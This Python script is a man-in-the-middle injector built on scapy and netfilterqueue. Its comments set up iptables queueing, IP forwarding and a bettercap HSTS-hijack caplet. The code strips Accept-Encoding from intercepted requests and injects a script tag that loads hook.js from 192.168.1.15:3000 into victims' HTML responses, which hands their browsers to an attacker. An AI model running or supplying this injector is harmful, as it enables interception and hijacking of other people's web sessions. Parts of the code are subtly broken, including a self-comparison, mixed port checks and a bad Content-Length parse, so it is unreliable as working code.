#!/usr/bin/env python

#command 1: sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
#           sudo iptables -I INPUT -j NFQUEUE --queue-num 0
#           sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
#command 2: sudo iptables --flush
#command 3: ping -c 1 bing.com
#commend 4: bettercap -iface enp0s3 -caplet hstshijack/hstshijack
#command 5: echo 1 > /proc/sys/net/ipv4/ip_forward


import scapy.all as scapy
import netfilterqueue
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    del packet[scapy.IP].len
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # convert to scapy format
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer(scapy.TCP): 
            load = scapy_packet[scapy.Raw].load
            if scapy_packet[scapy.TCP].dport == 80 or scapy_packet[scapy.TCP].dport == 443:
                print("[+] Request")
                #print(scapy_packet.show())
                # substitute the encoding field in html header with null string
                #modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "Accept-Encoding:identity\r\n", str(scapy_packet[scapy.Raw].load))
                modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(load))

            elif scapy_packet[scapy.TCP].sport == 80 or scapy_packet[scapy.TCP].dport == 443:
                print("[+] Response")
                #print(scapy_packet.show())
                injection_code = '<script src="http://192.168.1.15:3000/hook.js"></script>'
                modified_load = load.replace("</body>", injection_code + "</body>")
                # Search for a "Content-Length" expression in the modified html data
                # use double forward slash for escape character
                content_length_search = re.search("(?:Content-Length:\\s)(\\d*)", modified_load)
                if content_length_search and "text/html" in modified_load:
                    content_length = content_length_search.group(0)
                    new_content_length = int(content_length) + len(injection_code)
                    #print(content_length)
                    modified_load = modified_load.replace(content_length, str(new_content_length))

            # update the pkt only if either the Encoding or Content length is changed
            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(bytes(new_packet))

    packet.accept()



try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("[+] Detected CTRL + C.....closing the application....Please wait...")



